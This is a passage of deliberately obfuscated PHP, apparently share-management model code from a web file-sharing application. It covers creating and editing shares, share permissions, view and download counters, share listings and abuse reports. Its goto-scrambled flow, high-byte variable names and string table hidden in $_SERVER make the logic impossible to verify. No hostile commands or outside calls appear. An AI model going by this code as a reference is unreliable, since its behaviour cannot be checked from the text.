$bï˜Ì—Ú¸² = $this->_addShareData($dµŠ˜È­ˆå, $Bö”ƒ‹çø); if (!empty($Bö”ƒ‹çø[$BÏä’›˜[2230]])) { $this->_shareAuthSet($bï˜Ì—Ú¸², $Bö”ƒ‹çø[$BÏä’›˜[2230]]); } $this->shareEventAdd($dµŠ˜È­ˆå, $Bö”ƒ‹çø, $BÏä’›˜[1020]); return $bï˜Ì—Ú¸²; } private function shareEventAdd($F‡Àï´øÔ, $D†©«çÙ”, $F•äµ©Œ© = "\141\x64\144") { goto dÑ„Øğªµ; Dß‡†¢³ñ¡: if ($AÑñÑ‚«¨[$döÏËÅÕÃî[448]] == $döÏËÅÕÃî[468] && $D†©«çÙ”[$döÏËÅÕÃî[448]] == $döÏËÅÕÃî[83]) { $DÚ‰‘Ö‡ = $döÏËÅÕÃî[2232]; } if ($AÑñÑ‚«¨[$döÏËÅÕÃî[448]] == $döÏËÅÕÃî[83] && $D†©«çÙ”[$döÏËÅÕÃî[448]] == $döÏËÅÕÃî[468]) { $DÚ‰‘Ö‡ = $döÏËÅÕÃî[2235]; } Model($döÏËÅÕÃî[514])->eventShare($F‡Àï´øÔ, $DÚ‰‘Ö‡); goto Aä‰¶›…§»; dÑ„Øğªµ: $döÏËÅÕÃî =& $_SERVER[¯Ò¬Èè]; if ($F•äµ©Œ© == $döÏËÅÕÃî[1020]) { if ($D†©«çÙ”[$döÏËÅÕÃî[446]] == $döÏËÅÕÃî[83]) { Model($döÏËÅÕÃî[514])->eventShare($F‡Àï´øÔ, $döÏËÅÕÃî[2231]); } if ($D†©«çÙ”[$döÏËÅÕÃî[448]] == $döÏËÅÕÃî[83]) { Model($döÏËÅÕÃî[514])->eventShare($F‡Àï´øÔ, $döÏËÅÕÃî[2232]); } return; } $AÑñÑ‚«¨ = $this->getInfoByPath($F‡Àï´øÔ); goto aóİ«„Ö¡¶; aóİ«„Ö¡¶: $DÚ‰‘Ö‡ = $döÏËÅÕÃî[2233]; if ($AÑñÑ‚«¨[$döÏËÅÕÃî[446]] == $döÏËÅÕÃî[468] && $D†©«çÙ”[$döÏËÅÕÃî[446]] == $döÏËÅÕÃî[83]) { $DÚ‰‘Ö‡ = $döÏËÅÕÃî[2231]; } if ($AÑñÑ‚«¨[$döÏËÅÕÃî[446]] == $döÏËÅÕÃî[83] && $D†©«çÙ”[$döÏËÅÕÃî[446]] == $döÏËÅÕÃî[468]) { $DÚ‰‘Ö‡ = $döÏËÅÕÃî[2234]; } goto Dß‡†¢³ñ¡; Aä‰¶›…§»: return; goto C³–Í°±Œà; C³–Í°±Œà: } private function _addShareData($D© …Œ„ÈÏ, $f¤Óõê¯ŠÊ = array()) { goto a•×á“…àÉ; F†ã°‚É°Õ: $FÕ­İ—†Ï« = array($C¦ÔÒ¸äÃ[1437] => USER_ID, $C¦ÔÒ¸äÃ[383] => $D© …Œ„ÈÏ, $C¦ÔÒ¸äÃ[1352] => $C¦ÔÒ¸äÃ[33], $C¦ÔÒ¸äÃ[446] => 0, $C¦ÔÒ¸äÃ[448] => 0, $C¦ÔÒ¸äÃ[1028] => $C¦ÔÒ¸äÃ[33], $C¦ÔÒ¸äÃ[295] => $C¦ÔÒ¸äÃ[33], $C¦ÔÒ¸äÃ[811] => $C¦ÔÒ¸äÃ[33], $C¦ÔÒ¸äÃ[2237] => 0, $C¦ÔÒ¸äÃ[2238] => 0, $C¦ÔÒ¸äÃ[717] => 0, $C¦ÔÒ¸äÃ[2239] => $C¦ÔÒ¸äÃ[33], $C¦ÔÒ¸äÃ[443] => $C¦ÔÒ¸äÃ[33]); $fÆ•§ œ† = explode($C¦ÔÒ¸äÃ[47], $C¦ÔÒ¸äÃ[2240]); foreach ($fÆ•§ œ† as $C¢¢ˆÖ“çÀ) { if (!isset($f¤Óõê¯ŠÊ[$C¢¢ˆÖ“çÀ])) { continue; } $FÕ­İ—†Ï«[$C¢¢ˆÖ“çÀ] = $f¤Óõê¯ŠÊ[$C¢¢ˆÖ“çÀ]; } goto eŒïœ…‚¿; a•×á“…àÉ: $C¦ÔÒ¸äÃ =& $_SERVER[¯Ò¬Èè]; $EÜì›´—£² = array($C¦ÔÒ¸äÃ[383] => $D© …Œ„ÈÏ, $C¦ÔÒ¸äÃ[1437] => USER_ID); if ($D© …Œ„ÈÏ == 0) { $EÜì›´—£² = array($C¦ÔÒ¸äÃ[2236] => $f¤Óõê¯ŠÊ[$C¦ÔÒ¸äÃ[1028]], $C¦ÔÒ¸äÃ[1437] => USER_ID); } goto d¨÷À½¦; d¨÷À½¦: if ($eŞæ™ÊáÎƒ = $this->where($EÜì›´—£²)->find()) { return $eŞæ™ÊáÎƒ[$C¦ÔÒ¸äÃ[441]]; } if ($D© …Œ„ÈÏ == 0) { $dö…®®„ã = array($C¦ÔÒ¸äÃ[28] => get_path_this($f¤Óõê¯ŠÊ[$C¦ÔÒ¸äÃ[75]])); } else { $dö…®®„ã = Model($C¦ÔÒ¸äÃ[767])->sourceInfo($D© …Œ„ÈÏ); if (!$dö…®®„ã) { return !1; } } if (!$f¤Óõê¯ŠÊ[$C¦ÔÒ¸äÃ[1352]]) { $f¤Óõê¯ŠÊ[$C¦ÔÒ¸äÃ[1352]] = $dö…®®„ã[$C¦ÔÒ¸äÃ[28]]; } goto F†ã°‚É°Õ; Cé­Ú¢àè¶: return $D…„Œ†‘Ğ; goto C²ïÌ¾ô×; eŒïœ…‚¿: $D…„Œ†‘Ğ = $this->add($FÕ­İ—†Ï«); $F§Õ•‚İÔÏ = array($C¦ÔÒ¸äÃ[443] => short_id($D…„Œ†‘Ğ)); $this->where(array($C¦ÔÒ¸äÃ[440] => $D…„Œ†‘Ğ))->save($F§Õ•‚İÔÏ); goto Cé­Ú¢àè¶; C²ïÌ¾ô×: } private function _shareAuthSet($bóß¦‡£àõ, $b»Ô‡æ²òğ) { goto AèÑ°ìˆ á; AèÑ°ìˆ á: $DêšÒå¸×¦ =& $_SERVER[¯Ò¬Èè]; if (!is_array($b»Ô‡æ²òğ)) { return !1; } $A²­ÀéÅø™ = Model($DêšÒå¸×¦[2241]); goto Fñç»’‘™ğ; A²˜¡‰Î’Ú: return $A²­ÀéÅø™->addAll($Bœãá‡ã…¹, array(), !0); goto f‘éÙ‰³—º; Fñç»’‘™ğ: $A²­ÀéÅø™->where(array($DêšÒå¸×¦[441] => $bóß¦‡£àõ))->delete(); $Bœãá‡ã…¹ = array(); foreach ($b»Ô‡æ²òğ as $f„¹÷³šãº) { $fƒ¾ó³‰ñ¬ = SourceModel::TYPE_USER; if ($f„¹÷³šãº[$DêšÒå¸×¦[371]] == SourceModel::TYPE_GROUP) { $fƒ¾ó³‰ñ¬ = SourceModel::TYPE_GROUP; } $D°Õ¨î–¢ê = array($DêšÒå¸×¦[441] => $bóß¦‡£àõ, $DêšÒå¸×¦[371] => $fƒ¾ó³‰ñ¬, $DêšÒå¸×¦[456] => intval($f„¹÷³šãº[$DêšÒå¸×¦[456]]), $DêšÒå¸×¦[2242] => 0, $DêšÒå¸×¦[2243] => -1); if ($f„¹÷³šãº[$DêšÒå¸×¦[2242]]) { $D°Õ¨î–¢ê[$DêšÒå¸×¦[2242]] = $f„¹÷³šãº[$DêšÒå¸×¦[2242]]; } else { if ($f„¹÷³šãº[$DêšÒå¸×¦[2243]]) { $D°Õ¨î–¢ê[$DêšÒå¸×¦[2243]] = $f„¹÷³šãº[$DêšÒå¸×¦[2243]]; } } $Bœãá‡ã…¹[] = $D°Õ¨î–¢ê; } goto A²˜¡‰Î’Ú; f‘éÙ‰³—º: } public function numViewAdd($Aª¦éî¹…Å) { $a°Èò³Å­ë =& $_SERVER[¯Ò¬Èè]; $a¶•—×Ü˜¥ = array($a°Èò³Å­ë[440] => $Aª¦éî¹…Å); $this->where($a¶•—×Ü˜¥)->setAdd($a°Èò³Å­ë[2237]); } public function numDownloadAdd($d”•‚ÌÑˆ…) { $aŒ‘Ï†ß¦œ =& $_SERVER[¯Ò¬Èè]; $dù“ÀÌæ½º = array($aŒ‘Ï†ß¦œ[440] => $d”•‚ÌÑˆ…); $this->where($dù“ÀÌæ½º)->setAdd($aŒ‘Ï†ß¦œ[2238]); } protected function shareEdit($EÛ°†¥ìËº, $bÃØ‹‚Óµ) { goto Dí‘ğ‡å…ª; Dí‘ğ‡å…ª: $c¶Ò®’¯¿¨ =& $_SERVER[¯Ò¬Èè]; $A“Ğ«øµºÎ = $this->getInfo($EÛ°†¥ìËº); if (!$A“Ğ«øµºÎ) { return !1; } goto D¨¿ö‹˜Œë; f¤ìÚàå¶: if (isset($bÃØ‹‚Óµ[$c¶Ò®’¯¿¨[2230]])) { $this->_shareAuthSet($EÛ°†¥ìËº, $bÃØ‹‚Óµ[$c¶Ò®’¯¿¨[2230]]); } return !0; goto aò®ö…Ò˜; D¨¿ö‹˜Œë: $this->_checkLinkShare($bÃØ‹‚Óµ, $A“Ğ«øµºÎ); $cº‘›‚‹­ñ = array(); $d³ª¾ííò… = explode($c¶Ò®’¯¿¨[47], $c¶Ò®’¯¿¨[2244]); goto B‹§²•¥Ó™; B‹§²•¥Ó™: foreach ($d³ª¾ííò… as $DÏ„í¨„) { if (!array_key_exists($DÏ„í¨„, $bÃØ‹‚Óµ)) { continue; } $cº‘›‚‹­ñ[$DÏ„í¨„] = $bÃØ‹‚Óµ[$DÏ„í¨„]; } $this->shareEventAdd($A“Ğ«øµºÎ[$c¶Ò®’¯¿¨[369]], $bÃØ‹‚Óµ, $c¶Ò®’¯¿¨[2081]); $this->where(array($c¶Ò®’¯¿¨[440] => $EÛ°†¥ìËº))->save($cº‘›‚‹­ñ); goto f¤ìÚàå¶; aò®ö…Ò˜: } private function _checkLinkShare($EÜ¨¨„Ò, $eÎ‚¾ƒÆô‘) { goto eÚ‰—Ä; A­ÚŸ‹­: $c§¢ÙÏ“É = $this->shareFileMeta($Bí¾‹¿¯Ş[$D—À‰­ôŞ¿[419]]); if (isset($c§¢ÙÏ“É[$D—À‰­ôŞ¿[359]]) && $c§¢ÙÏ“É[$D—À‰­ôŞ¿[359]] == $D—À‰­ôŞ¿[83]) { show_json(LNG($D—À‰­ôŞ¿[2247]), !1); } goto e‰­£Ú×‚; C“·®•Ğ”„: if ($eÎ‚¾ƒÆô‘[$D—À‰­ôŞ¿[391]][$D—À‰­ôŞ¿[29]] != $D—À‰­ôŞ¿[167]) { $a¸Ò©‡¯Á = $this->_folderReport($B÷„ááİç); if (!$a¸Ò©‡¯Á) { return; } show_json(LNG($D—À‰­ôŞ¿[2245]) . $D—À‰­ôŞ¿[2246] . $a¸Ò©‡¯Á, !1); } $Bí¾‹¿¯Ş = Model($D—À‰­ôŞ¿[767])->fileInfoGet($eÎ‚¾ƒÆô‘[$D—À‰­ôŞ¿[391]][$D—À‰­ôŞ¿[369]]); if (!$Bí¾‹¿¯Ş) { return; } goto A­ÚŸ‹­; eÚ‰—Ä: $D—À‰­ôŞ¿ =& $_SERVER[¯Ò¬Èè]; if ($EÜ¨¨„Ò[$D—À‰­ôŞ¿[446]] != $D—À‰­ôŞ¿[83]) { return; } $B÷„ááİç = $eÎ‚¾ƒÆô‘[$D—À‰­ôŞ¿[391]][$D—À‰­ôŞ¿[369]]; goto C“·®•Ğ”„; e‰­£Ú×‚: } private function _folderReport($B‘„İ•Ô) { goto D†â–µÛ”…; fÎŸ¸™„™: $aªŞÆæ£Ü = array_to_keyvalue($EÇë­Œ»¡˜, $C‘³Ş‰®ŒÀ[33], $C‘³Ş‰®ŒÀ[28]); $aªŞÆæ£Ü[] = $Cµä‚ÚŸ‚[$C‘³Ş‰®ŒÀ[28]]; return implode($C‘³Ş‰®ŒÀ[8], $aªŞÆæ£Ü); goto B´°Ãµ„Á; Dãí²öÁ…: $dÔ‘¤Ùƒ… = substr($Cµä‚ÚŸ‚[$C‘³Ş‰®ŒÀ[459]], strpos($Cµä‚ÚŸ‚[$C‘³Ş‰®ŒÀ[459]], $båÕ‹·ÃÔ)); $Fø—á®¦±À = array($C‘³Ş‰®ŒÀ[369] => array($C‘³Ş‰®ŒÀ[7], trim($dÔ‘¤Ùƒ…, $C‘³Ş‰®ŒÀ[47]))); $EÇë­Œ»¡˜ = Model($C‘³Ş‰®ŒÀ[767])->where($Fø—á®¦±À)->field($C‘³Ş‰®ŒÀ[28])->select(); goto fÎŸ¸™„™; B¸‰¯İ¤¡™: $Fø—á®¦±À = array($C‘³Ş‰®ŒÀ[419] => array($C‘³Ş‰®ŒÀ[7], $e‚ÇÌ‘Ï½Ï), $C‘³Ş‰®ŒÀ[459] => array($C‘³Ş‰®ŒÀ[766], "\45{$båÕ‹·ÃÔ}\x25"), $C‘³Ş‰®ŒÀ[397] => 0); $Cµä‚ÚŸ‚ = Model($C‘³Ş‰®ŒÀ[767])->where($Fø—á®¦±À)->field($C‘³Ş‰®ŒÀ[2249])->find(); if (!$Cµä‚ÚŸ‚) { return !1; } goto Dãí²öÁ…; A•®ˆƒ×Ò: if (!$e‚ÇÌ‘Ï½Ï) { return !1; } $e‚ÇÌ‘Ï½Ï = array_to_keyvalue($e‚ÇÌ‘Ï½Ï, $C‘³Ş‰®ŒÀ[33], $C‘³Ş‰®ŒÀ[419]); $båÕ‹·ÃÔ = $C‘³Ş‰®ŒÀ[47] . $B‘„İ•Ô . $C‘³Ş‰®ŒÀ[47]; goto B¸‰¯İ¤¡™; D†â–µÛ”…: $C‘³Ş‰®ŒÀ =& $_SERVER[¯Ò¬Èè]; $Fø—á®¦±À = array($C‘³Ş‰®ŒÀ[419] => array($C‘³Ş‰®ŒÀ[935], 0), $C‘³Ş‰®ŒÀ[703] => 3); $e‚ÇÌ‘Ï½Ï = Model($C‘³Ş‰®ŒÀ[2248])->where($Fø—á®¦±À)->field($C‘³Ş‰®ŒÀ[419])->select(); goto A•®ˆƒ×Ò; B´°Ãµ„Á: } protected function remove($C“§øÎ’“Í) { goto d„²—å¹´¸; d„²—å¹´¸: $DÂÂù‰‘Á† =& $_SERVER[¯Ò¬Èè]; if (is_array($C“§øÎ’“Í)) { $C“§øÎ’“Í = array($DÂÂù‰‘Á†[7], $C“§øÎ’“Í); } $EîäÔÜŞ‰Ø = array($DÂÂù‰‘Á†[441] => $C“§øÎ’“Í); goto d¼Šº…àË; d¼Šº…àË: $cŠÚ÷»ò¥¶ = $this->where($EîäÔÜŞ‰Ø)->delete(); if ($cŠÚ÷»ò¥¶) { Model($DÂÂù‰‘Á†[546])->where(array($DÂÂù‰‘Á†[441] => $C“§øÎ’“Í))->delete(); } $c¦ìÅîÚÛ = is_array($C“§øÎ’“Í) ? $C“§øÎ’“Í[1] : array($C“§øÎ’“Í); goto a¼—Ø“Öé©; a¼—Ø“Öé©: for ($bË•²–·ƒÉ = 0; $bË•²–·ƒÉ < count($c¦ìÅîÚÛ); $bË•²–·ƒÉ++) { $AÆà¸¨²Ø = $this->getInfo($c¦ìÅîÚÛ[$bË•²–·ƒÉ]); if ($AÆà¸¨²Ø[$DÂÂù‰‘Á†[448]] == $DÂÂù‰‘Á†[83]) { Model($DÂÂù‰‘Á†[514])->eventShare($AÆà¸¨²Ø[$DÂÂù‰‘Á†[369]], $DÂÂù‰‘Á†[2235]); } if ($AÆà¸¨²Ø[$DÂÂù‰‘Á†[446]] == $DÂÂù‰‘Á†[83]) { Model($DÂÂù‰‘Á†[514])->eventShare($AÆà¸¨²Ø[$DÂÂù‰‘Á†[369]], $DÂÂù‰‘Á†[2234]); } } return $cŠÚ÷»ò¥¶; goto CÏô×æáÚ¯; CÏô×æáÚ¯: } protected function removeBySource($dñ²ÎÎÒ«Ü) { goto a—É½¿œ¬; a”öìÁÇ”Ü: $eÑª©ÚŸ¡· = array_to_keyvalue($eÑª©ÚŸ¡·, $fŞÚ’ª½»¦[33], $fŞÚ’ª½»¦[441]); if (!$eÑª©ÚŸ¡·) { return; } $F†Âé‰»£‰ = array($fŞÚ’ª½»¦[440] => array($fŞÚ’ª½»¦[384], $eÑª©ÚŸ¡·)); goto aÇñŒÜ‚³; aÇñŒÜ‚³: $this->where($F†Âé‰»£‰)->delete(); Model($fŞÚ’ª½»¦[546])->where($F†Âé‰»£‰)->delete(); goto BØÉ‹âÒ‡´; a—É½¿œ¬: $fŞÚ’ª½»¦ =& $_SERVER[¯Ò¬Èè]; $F†Âé‰»£‰ = array($fŞÚ’ª½»¦[383] => array($fŞÚ’ª½»¦[384], $dñ²ÎÎÒ«Ü)); $eÑª©ÚŸ¡· = $this->field($fŞÚ’ª½»¦[441])->where($F†Âé‰»£‰)->select(); goto a”öìÁÇ”Ü; BØÉ‹âÒ‡´: } public function listAll($FŸ¸Õˆ¶å) { goto bƒ‹‚Ç¨İ…; EçÄÙÎİåÊ: $Cçˆ‡Éô = $this->_makeOrder()->where($A·Ê½æÚÔ)->selectPage(20); if (empty($Cçˆ‡Éô[$cçğÏå²·[354]])) { return array(); } $this->_listDataApply($Cçˆ‡Éô[$cçğÏå²·[354]]); goto f¢â¸êà›¤; f¢â¸êà›¤: return $Cçˆ‡Éô; goto B¨µ¼ãÙ; bƒ‹‚Ç¨İ…: $cçğÏå²· =& $_SERVER[¯Ò¬Èè]; $A·Ê½æÚÔ = array(); if ($FŸ¸Õˆ¶å[$cçğÏå²·[1446]]) { $A·Ê½æÚÔ[$cçğÏå²·[1446]] = $FŸ¸Õˆ¶å[$cçğÏå²·[1446]]; } goto CèŒÃÙ†”; CèŒÃÙ†”: if ($FŸ¸Õˆ¶å[$cçğÏå²·[716]]) { $eñÈ·ŒÌö» = $FŸ¸Õˆ¶å[$cçğÏå²·[717]] ? $FŸ¸Õˆ¶å[$cçğÏå²·[717]] : strtotime(date($cçğÏå²·[2250])); $A·Ê½æÚÔ[$cçğÏå²·[187]] = array($cçğÏå²·[321], array($FŸ¸Õˆ¶å[$cçğÏå²·[716]], $eñÈ·ŒÌö»)); } if ($FŸ¸Õˆ¶å[$cçğÏå²·[29]]) { $A·Ê½æÚÔ[$FŸ¸Õˆ¶å[$cçğÏå²·[29]]] = 1; } else { $A·Ê½æÚÔ[] = array($cçğÏå²·[446] => array($cçğÏå²·[935], 0), $cçğÏå²·[448] => array($cçğÏå²·[935], 0), $cçğÏå²·[2225] => $cçğÏå²·[2194]); } if ($FŸ¸Õˆ¶å[$cçğÏå²·[2190]]) { $A·Ê½æÚÔ[] = array($cçğÏå²·[443] => $FŸ¸Õˆ¶å[$cçğÏå²·[2190]], $cçğÏå²·[1352] => array($cçğÏå²·[766], "\45{$FŸ¸Õˆ¶å[$cçğÏå²·[2190]]}\x25"), $cçğÏå²·[2225] => $cçğÏå²·[2194]); } goto EçÄÙÎİåÊ; B¨µ¼ãÙ: } public function listDataApply($a”ÖÂä‘­—) { $this->_listDataApply($a”ÖÂä‘­—); return $a”ÖÂä‘­—; } private function _listDataApply(&$Cªˆ‚­¼œ) { $DÂ¢µÒ™©Ë =& $_SERVER[¯Ò¬Èè]; $F­„‘áºÃİ = array_to_keyvalue($Cªˆ‚­¼œ, $DÂ¢µÒ™©Ë[33], $DÂ¢µÒ™©Ë[1446]); $câ‚ñÙØå× = Model($DÂ¢µÒ™©Ë[477])->userListInfo(array_unique($F­„‘áºÃİ)); $BĞæàñÀ­ = array_to_keyvalue($Cªˆ‚­¼œ, $DÂ¢µÒ™©Ë[33], $DÂ¢µÒ™©Ë[369]); $fòß¾ªŒêñ = Model($DÂ¢µÒ™©Ë[767])->sourceListInfo($BĞæàñÀ­, !0); foreach ($Cªˆ‚­¼œ as &$d¢‚ËÑÎ) { $b³ç‹Œç×è = $d¢‚ËÑÎ[$DÂ¢µÒ™©Ë[1446]]; $d¢‚ËÑÎ[$DÂ¢µÒ™©Ë[2251]] = $câ‚ñÙØå×[$b³ç‹Œç×è] ? $câ‚ñÙØå×[$b³ç‹Œç×è] : !1; $DÊä‡ïÇ·¿ = $d¢‚ËÑÎ[$DÂ¢µÒ™©Ë[369]]; $d¢‚ËÑÎ[$DÂ¢µÒ™©Ë[391]] = $fòß¾ªŒêñ[$DÊä‡ïÇ·¿] ? $fòß¾ªŒêñ[$DÊä‡ïÇ·¿] : !1; } } private function _makeOrder($dŠÊóÂ¼Æ = '') { goto AÇ‚©šõ¬Ü; AÇ‚©šõ¬Ü: $EÁ˜†øÒİ =& $_SERVER[¯Ò¬Èè]; $bø²àßˆ…  = array($EÁ˜†øÒİ[187], $EÁ˜†øÒİ[717], $EÁ˜†øÒİ[2237], $EÁ˜†øÒİ[2238]); $cš¢Ï™í¡ê = array($EÁ˜†øÒİ[402] => $EÁ˜†øÒİ[403], $EÁ˜†øÒİ[404] => $EÁ˜†øÒİ[405]); goto CÓ…šé‡¿; CÓ…šé‡¿: $eÖ‡µĞÊ¿Ü = Input::get($EÁ˜†øÒİ[407], $EÁ˜†øÒİ[7], $EÁ˜†øÒİ[389], $bø²àßˆ… ); $CøØº£¡£ = Input::get($EÁ˜†øÒİ[408], $EÁ˜†øÒİ[7], $EÁ˜†øÒİ[2252], array($EÁ˜†øÒİ[2189], $EÁ˜†øÒİ[404])); $CøØº£¡£ = $cš¢Ï™í¡ê[$CøØº£¡£]; goto añš„ßÇäõ; añš„ßÇäõ: $dŠÊóÂ¼Æ = $dŠÊóÂ¼Æ . "{$eÖ‡µĞÊ¿Ü}\40{$CøØº£¡£}"; return $this->order($dŠÊóÂ¼Æ); goto föÏ¹‰Íˆğ; föÏ¹‰Íˆğ: } public function reportAdd($B¤ÆÊà…õÉ) { $aÇÛÀŠ¯’‹ =& $_SERVER[¯Ò¬Èè]; $D•¡ŠàÎ±É = array($aÇÛÀŠ¯’‹[441] => $B¤ÆÊà…õÉ[$aÇÛÀŠ¯’‹[441]], $aÇÛÀŠ¯’‹[1446] => USER_ID); if (Model($aÇÛÀŠ¯’‹[2248])->where($D•¡ŠàÎ±É)->find()) { return !1; } $Eœ×íæ­ÉÚ = array($aÇÛÀŠ¯’‹[441] => $B¤ÆÊà…õÉ[$aÇÛÀŠ¯’‹[441]], $aÇÛÀŠ¯’‹[1352] => $B¤ÆÊà…õÉ[$aÇÛÀŠ¯’‹[1352]], $aÇÛÀŠ¯’‹[369] => $B¤ÆÊà…õÉ[$aÇÛÀŠ¯’‹[369]], $aÇÛÀŠ¯’‹[419] => $B¤ÆÊà…õÉ[$aÇÛÀŠ¯’‹[419]], $aÇÛÀŠ¯’‹[1446] => USER_ID, $aÇÛÀŠ¯’‹[29] => $B¤ÆÊà…õÉ[$aÇÛÀŠ¯’‹[29]], $aÇÛÀŠ¯’‹[405] => $B¤ÆÊà…õÉ[$aÇÛÀŠ¯’‹[405]]); return Model($aÇÛÀŠ¯’‹[2248])->add($Eœ×íæ­ÉÚ); } public function reportList($EÏ®…„İ¬“) { goto bÛºŸ´Ì•‡; dŠ„âñˆƒ: $d‹èâ¯¼ô = array($D‘„ÜíªöŒ[402] => $D‘„ÜíªöŒ[403], $D‘„ÜíªöŒ[404] => $D‘„ÜíªöŒ[405]); $Bá·ë‘Û¦Ñ = $D‘„ÜíªöŒ[2256] . $d‹èâ¯¼ô[$BÀ–‹äà²©]; $FØ´½Ñ·ï¢ = Model($D‘„ÜíªöŒ[2248])->where($F±¥›Á»«Î)->order($Bá·ë‘Û¦Ñ)->selectPage(20); goto dÛ‚ŸÇÇÉí; dØ™©ˆÄŒã: if (isset($EÏ®…„İ¬“[$D‘„ÜíªöŒ[29]]) && in_array($EÏ®…„İ¬“[$D‘„ÜíªöŒ[29]], array($D‘„ÜíªöŒ[83], $D‘„ÜíªöŒ[2253], $D‘„ÜíªöŒ[2254], $D‘„ÜíªöŒ[2255], $D‘„ÜíªöŒ[1929]))) { $F±¥›Á»«Î[$D‘„ÜíªöŒ[29]] = $EÏ®…„İ¬“[$D‘„ÜíªöŒ[29]]; } if (isset($EÏ®…„İ¬“[$D‘„ÜíªöŒ[703]]) && in_array($EÏ®…„İ¬“[$D‘„ÜíªöŒ[703]], array($D‘„ÜíªöŒ[468], $D‘„ÜíªöŒ[83], $D‘„ÜíªöŒ[2253], $D‘„ÜíªöŒ[2254]))) { $F±¥›Á»«Î[$D‘„ÜíªöŒ[703]] = $EÏ®…„İ¬“[$D‘„ÜíªöŒ[703]]; } $BÀ–‹äà²© = Input::get($D‘„ÜíªöŒ[408], $D‘„ÜíªöŒ[7], $D‘„ÜíªöŒ[2252], array($D‘„ÜíªöŒ[2189], $D‘„ÜíªöŒ[404])); goto dŠ„âñˆƒ; bÛºŸ´Ì•‡: $D‘„ÜíªöŒ =& $_SERVER[¯Ò¬Èè]; $F±¥›Á»«Î = array(); if ($EÏ®…„İ¬“[$D‘„ÜíªöŒ[716]]) { $dî¯àä³Ü = $EÏ®…„İ¬“[$D‘„ÜíªöŒ[717]] ? $EÏ®…„İ¬“[$D‘„ÜíªöŒ[717]] : strtotime(date($D‘„ÜíªöŒ[2250])); $F±¥›Á»«Î[$D‘„ÜíªöŒ[187]] = array($D‘„ÜíªöŒ[321], array($EÏ®…„İ¬“[$D‘„ÜíªöŒ[716]], $dî¯àä³Ü)); } goto dØ™©ˆÄŒã; dÛ‚ŸÇÇÉí: if (empty($FØ´½Ñ·ï¢[$D‘„ÜíªöŒ[354]])) { return array(); } $this->_listDataApply($FØ´½Ñ·ï¢[$D‘„ÜíªöŒ[354]]); return $FØ´½Ñ·ï¢; goto a¤Î´İ†ä“; a¤Î´İ†ä“: } public function reportStatus($c•’ÊĞñÌ­) { goto eµÆ¯Ä÷—; eµÆ¯Ä÷—: $eÊĞòŠ° =& $_SERVER[¯Ò¬Èè]; $e«Œ•Í¯“Â = array($eÊĞòŠ°[367] => $c•’ÊĞñÌ­[$eÊĞòŠ°[367]]); $B‚ÙÙôªÂ = Model($eÊĞòŠ°[2248])->where($e«Œ•Í¯“Â)->field($eÊĞòŠ°[2257])->find(); goto f˜¦«±ÚÂ; F•—ë¦Ã­”: return $dí¦Äã™; goto B¹ãÁ¦éÜì; f˜¦«±ÚÂ: if (!$B‚ÙÙôªÂ) { return !1; } $d›‹ÈÇ¡‚‰ = array($eÊĞòŠ°[703] => $c•’ÊĞñÌ­[$eÊĞòŠ°[703]]); if ($c•’ÊĞñÌ­[$eÊĞòŠ°[703]] == $eÊĞòŠ°[2254] && $B‚ÙÙôªÂ[$eÊĞòŠ°[703]] == $eÊĞòŠ°[2254]) { $d›‹ÈÇ¡‚‰[$eÊĞòŠ°[703]] = 0; } goto e©ßô„ô“Ò; e©ßô„ô“Ò: $dí¦Äã™ = Model($eÊĞòŠ°[2248])->where($e«Œ•Í¯“Â)->save($d›‹ÈÇ¡‚‰); if ($c•’ÊĞñÌ­[$eÊĞòŠ°[703]] == $eÊĞòŠ°[2253]) { if ($B‚ÙÙôªÂ[$eÊĞòŠ°[419]] != $eÊĞòŠ°[468] && $this->shareFileMeta($B‚ÙÙôªÂ[$eÊĞòŠ°[419]])) { $this->shareFileMeta($B‚ÙÙôªÂ[$eÊĞòŠ°[419]], 0); } $this->remove($B‚ÙÙôªÂ[$eÊĞòŠ°[441]]); return !0; } if ($dí¦Äã™ && $c•’ÊĞñÌ­[$eÊĞòŠ°[703]] == $eÊĞòŠ°[2254]) { $EÌŒŞ¥ğÀÚ = $d›‹ÈÇ¡‚‰[$eÊĞòŠ°[703]] == $eÊĞòŠ°[2254] ? 1 : 0; $this->shareFileMeta($B‚ÙÙôªÂ[$eÊĞòŠ°[419]], $EÌŒŞ¥ğÀÚ); $this->removeByFile($B‚ÙÙôªÂ[$eÊĞòŠ°[419]]); } goto F•—ë¦Ã­”; B¹ãÁ¦éÜì: } private function removeByFile($Fî¿©È›ô) { goto d¹–÷‰†ƒº; d¹–÷‰†ƒº: $fŠõÍ‰°ßƒ =& $_SERVER[¯Ò¬Èè]; $AäŞÚ’§Â÷ = Model($fŠõÍ‰°ßƒ[767])->where(array($fŠõÍ‰°ßƒ[419] => $Fî¿©È›ô))->field($fŠõÍ‰°ßƒ[369])->select(); $Bù²Ø¸ˆ¸ = array_to_keyvalue($AäŞÚ’§Â÷, $fŠõÍ‰°ßƒ[33], $fŠõÍ‰°ßƒ[369]); goto A·Ğ˜Â§Ì; A·Ğ˜Â§Ì: $DÉ”µêÁŸç = array($fŠõÍ‰°ßƒ[369] => array($fŠõÍ‰°ßƒ[7], $Bù²Ø¸ˆ¸), $fŠõÍ‰°ßƒ[446] => 1); $AäŞÚ’§Â÷ = Model($fŠõÍ‰°ßƒ[2091])->where($DÉ”µêÁŸç)->field($fŠõÍ‰°ßƒ[441])->select(); if (empty($AäŞÚ’§Â÷)) { return; } goto aÈ›“°ÌÁà; aÈ›“°ÌÁà: $F†ğ¦¼¯ÅÕ = array_to_keyvalue($AäŞÚ’§Â÷, $fŠõÍ‰°ßƒ[33], $fŠõÍ‰°ßƒ[441]); $this->remove($F†ğ¦¼¯ÅÕ); goto eÄÍæ¶‰›; eÄÍæ¶‰›: } private function shareFileMeta($Cøİ‘‹Ú¿¯, $Aš†ÀÚÇ† = null) { $aö ’½Ø°Œ =& $_SERVER[¯Ò¬Èè]; $D‚¾Æó¿Å = array($aö ’½Ø°Œ[419] => $Cøİ‘‹Ú¿¯, $aö ’½Ø°Œ[89] => $aö ’½Ø°Œ[2258]); if (is_null($Aš†ÀÚÇ†)) { return Model($aö ’½Ø°Œ[2259])->where($D‚¾Æó¿Å)->find(); } $D‚¾Æó¿Å[$aö ’½Ø°Œ[359]] = $Aš†ÀÚÇ†; Model($aö ’½Ø°Œ[2259])->add($D‚¾Æó¿Å, array(), !0); } } goto cÆ½ÊË…ê; cìí«ˆ¬Ôæ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($aÖë¾îË¤) { goto A·×’Ş£Õ; A·×’Ş£Õ: $EÃğ–…ÊĞñ =& $_SERVER[¯Ò¬Èè]; $e¡«Ä©Éëµ 